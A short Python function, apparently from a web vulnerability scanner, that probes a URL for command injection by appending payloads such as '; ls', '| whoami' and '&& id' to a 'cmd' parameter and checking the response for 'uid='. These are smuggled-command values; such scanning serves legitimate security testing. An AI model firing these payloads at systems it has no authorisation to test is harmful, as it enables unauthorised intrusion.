import requests

def test_command_injection(url):
    payloads = [
        "; ls",
        "| whoami",
        "&& id",
    ]

    results = []

    for payload in payloads:
        try:
            full_url = f"{url}?cmd={payload}"
            response = requests.get(full_url)
            if "uid=" in response.text:
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except Exception as e:
            return {"error": f"Error testing Command Injection: {str(e)}"}

    return {"results": results}